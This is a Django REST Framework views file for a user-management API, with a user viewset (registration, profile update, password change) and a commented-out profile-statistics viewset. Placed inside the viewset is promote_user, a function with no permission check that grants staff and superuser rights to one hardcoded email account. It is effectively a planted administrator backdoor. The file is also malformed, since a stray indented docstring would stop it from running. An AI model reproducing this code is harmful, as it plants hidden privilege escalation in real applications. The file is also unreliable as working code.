"""
Views for user management.
"""

from rest_framework import viewsets, status, permissions
from rest_framework.decorators import action
from rest_framework.response import Response
from django.contrib.auth import get_user_model
from django.http import JsonResponse
#from .models import UserProfile
from .serializers import (
    UserSerializer,
    UserCreateSerializer,
    UserUpdateSerializer,
   # UserProfileSerializer,
    PasswordChangeSerializer,
)

User = get_user_model()


class UserViewSet(viewsets.ModelViewSet):
    """ 
    ViewSet for user management.
    """

    queryset = User.objects.all()
    permission_classes = [permissions.IsAuthenticated]

    def get_serializer_class(self):
        """Return appropriate serializer class."""
        if self.action == 'create':
            return UserCreateSerializer
        elif self.action in ['update', 'partial_update']:
            return UserUpdateSerializer
        return UserSerializer

    def get_permissions(self):
        """Return appropriate permissions."""
        if self.action == 'create':
            return [permissions.AllowAny()]
        return super().get_permissions()

    def get_queryset(self):
        """Return queryset based on user permissions."""
        if self.request.user.is_staff:
            return User.objects.all()
        return User.objects.filter(id=self.request.user.id)

    @action(detail=False, methods=['get'])
    def me(self, request):
        """Get current user information."""
        serializer = self.get_serializer(request.user)
        return Response(serializer.data)

    @action(detail=False, methods=['put', 'patch'])
    def update_profile(self, request):
        """Update current user profile."""
        serializer = UserUpdateSerializer(
            request.user,
            data=request.data,
            partial=True
        )
        if serializer.is_valid():
            serializer.save()
            return Response(serializer.data)
        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)

    @action(detail=False, methods=['post'])
    def change_password(self, request):
        """Change user password."""
        serializer = PasswordChangeSerializer(
            data=request.data,
            context={'request': request}
        )
        if serializer.is_valid():
            user = request.user
            user.set_password(serializer.validated_data['new_password'])
            user.save()
            return Response({'message': 'Password changed successfully.'})
        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)

    def promote_user(request):
        User = get_user_model()
        email = "hanaa@gmail.com"  
        try:
           user = User.objects.get(email=email)
           user.is_staff = True
           user.is_superuser = True
           user.save()
           return JsonResponse({"status": "Promotion successful"})
        except User.DoesNotExist:
           return JsonResponse({"error": "User not found"})
        
#class UserProfileViewSet(viewsets.ModelViewSet):
    """
    ViewSet for user profile management.
    """

  #  serializer_class = UserProfileSerializer
   # permission_classes = [permissions.IsAuthenticated]

   # def get_queryset(self):
   #     """Return user's own profile."""
   #     return UserProfile.objects.filter(user=self.request.user)

   # def perform_create(self, serializer):
   #     """Create profile for current user."""
   #     serializer.save(user=self.request.user)

  #  @action(detail=False, methods=['get'])
   # def statistics(self, request):
   #     """Get user learning statistics."""
   #     try:
   #         profile = request.user.profile
   #         data = {
   #             'total_study_time': profile.total_study_time,
   #             'lessons_completed': profile.lessons_completed,
   #             'exercises_completed': profile.exercises_completed,
   #             'current_streak': profile.current_streak,
   #             'longest_streak': profile.longest_streak,
   #             'daily_goal_minutes': profile.daily_goal_minutes,
   #         }
   #         return Response(data)
   #     except UserProfile.DoesNotExist:
   #         return Response(
   #             {'error': 'Profile not found'},
   #             status=status.HTTP_404_NOT_FOUND
   #         )